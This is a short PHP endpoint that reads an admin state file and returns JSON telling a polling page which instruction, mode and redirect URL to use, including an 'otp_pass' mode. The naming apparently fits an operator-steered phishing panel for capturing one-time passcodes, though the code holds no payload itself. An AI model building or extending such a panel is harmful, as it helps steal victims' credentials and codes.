<?php
$stateFile = __DIR__ . '/admin_state.json';

$defaults = [
    'mode' => 'default',
    'custom_url' => '',
    'instruction' => 'stay_wait',
    'instruction_token' => time(),
    'chat_enabled' => false
];

if (!file_exists($stateFile)) {
    $state = $defaults;
} else {
    $raw = json_decode(file_get_contents($stateFile), true);
    $state = is_array($raw) ? array_merge($defaults, $raw) : $defaults;
}

if (isset($state['mode']) && $state['mode'] === 'otp_pass') {
    $state['mode'] = 'default';
    $state['instruction'] = $state['instruction'] ?? 'otp_pass';
}

if (empty($state['instruction_token'])) {
    $state['instruction_token'] = time();
}

header('Content-Type: application/json');
echo json_encode([
    'instruction' => $state['instruction'],
    'instruction_token' => $state['instruction_token'],
    'mode' => $state['mode'],
    'chat_enabled' => !empty($state['chat_enabled']),
    'custom_url' => $state['custom_url'] ?? ''
]);
